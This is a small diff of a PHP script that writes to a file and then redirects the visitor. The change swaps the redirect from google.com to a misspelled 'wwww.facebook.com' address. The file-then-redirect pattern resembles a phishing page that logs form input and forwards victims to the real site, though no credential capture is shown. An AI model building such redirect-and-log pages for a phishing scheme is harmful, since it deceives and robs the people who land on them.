@@ -22,6 +22,6 @@ fwrite($file, "\t\t\t\t\t\t");
 fclose($file);
 
 // Redirect to the new desired page (replace 'index.html' with your page)
-header("Location: google.com");
+header("Location: https://wwww.facebook.com");
 die();
 ?>
